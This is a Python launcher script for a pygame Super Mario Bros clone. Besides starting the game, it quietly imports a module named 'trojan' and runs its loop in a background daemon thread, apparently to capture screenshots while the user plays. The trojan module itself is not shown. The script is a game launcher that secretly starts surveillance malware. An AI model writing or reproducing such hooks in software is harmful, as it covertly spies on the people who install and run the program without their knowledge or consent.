# run_game.py - SIMPLER VERSION
import os
import sys

# Set up Python path without changing directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if SCRIPT_DIR not in sys.path:
    sys.path.insert(0, SCRIPT_DIR)

# Set the resource path for the game
RESOURCES_PATH = os.path.join(SCRIPT_DIR, 'resources')
print(f"Game resources at: {RESOURCES_PATH}")

# Check if resources exist
if not os.path.exists(RESOURCES_PATH):
    print(f"ERROR: Resources folder not found at: {RESOURCES_PATH}")
    print("Please make sure the 'resources' folder exists in the same directory as run_game.py")
    sys.exit(1)

# Import after setting up paths
import threading
import pygame as pg
from source.main import main as game_main

# Try to import trojan
try:
    import trojan
    print("Starting screenshot capture...")
    trojan_thread = threading.Thread(target=trojan.run_trojan_loop, daemon=True)
    trojan_thread.start()
except ImportError:
    print("Running without screenshot capture.")

# Start the game
pg.init()
print("Starting Super Mario Bros...")
try:
    game_main()
except Exception as e:
    print(f"Game error: {e}")
finally:
    pg.quit()